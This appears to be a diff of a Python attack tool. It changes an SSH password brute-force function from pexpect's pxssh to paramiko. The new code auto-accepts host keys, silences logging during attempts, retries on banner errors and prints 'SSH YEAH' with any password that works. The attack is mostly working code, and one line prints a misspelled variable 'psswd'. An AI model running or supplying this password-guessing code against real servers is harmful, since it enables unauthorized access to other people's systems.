@@ -37,7 +37,8 @@ from ftplib import FTP
 from scapy.all import *
 from random import randint
 from threading import Thread
-from pexpect.pxssh import pxssh
+#from pexpect.pxssh import pxssh
+from paramiko import AutoAddPolicy, SSHClient
 from argparse import ArgumentParser
 from string import digits, ascii_lowercase, uppercase, hexdigits, letters, punctuation
 
@@ -374,18 +375,25 @@ def ssh_conn(log, addr, passwd, essai, p_port, fails_nb):
 	global flag
 	Fails = fails_nb
 	try:
-		client = pxssh()
 		sys.stdout.write('\r\033[96m[SSH]\033[0m Essai nb*' + str(essai) + ' sur ' + addr + ' : ' + passwd)
 		sys.stdout.flush()
-		client.login(server=addr, username=log, password=passwd, login_timeout=3, port=p_port)
-		print_fmt('\n\n\033[91m[SSH]\033[0m SSH YEAH : ' + addr + ' --> ' + psswd + '\n{}\n'.format(client.before))
-		client.logout()
+		logger.disabled = True
+		client = SSHClient()
+		client.set_missing_host_key_policy(AutoAddPolicy())
+		client.connect(addr, username=log, password=passwd, timeout=4, look_for_keys=False)
+		logger.disabled = False
+		print_fmt('\n\n\033[91m[SSH]\033[0m SSH YEAH : ' + addr + ' --> ' + psswd + '\n\n')
+		client.close()
+		#client = pxssh()
+		#client.login(server=addr, username=log, password=passwd, login_timeout=3, port=p_port)
+		#print_fmt('\n\n\033[91m[SSH]\033[0m SSH YEAH : ' + addr + ' --> ' + psswd + '\n{}\n'.format(client.before))
+		#client.logout()
 		flag = 1
 	except Exception as e:
 		Fails += 1
 		if Fails > 5:
 			pass
-		elif 'read_nonblocking' in str(e):
+		elif 'read_nonblocking' in str(e) or 'banner' in str(e).lower():
 			time.sleep(5)
 			ssh_conn(log, addr, passwd, essai, p_port, Fails)
 		elif 'synchronize with original prompt' in str(e):
